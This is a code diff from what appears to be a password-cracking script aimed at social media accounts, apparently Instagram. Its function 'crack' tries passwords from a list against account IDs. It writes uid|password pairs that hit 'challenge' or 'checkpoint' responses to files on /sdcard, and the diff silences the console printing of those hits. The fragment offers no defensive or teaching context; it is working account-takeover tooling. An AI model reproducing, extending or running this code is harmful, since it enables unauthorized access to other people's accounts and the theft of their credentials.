@@ -235,12 +235,12 @@ def crack(uid, password_list, total_count):
                    oks.append(uid)
                    return True       
             elif 'challenge_required' in response.text:
-                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
+                #print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                 open("/sdcard/SUMON_INS_CH.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 continue
             elif 'checkpoint_required' in response.text:
-                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
+                #print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                 open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 continue
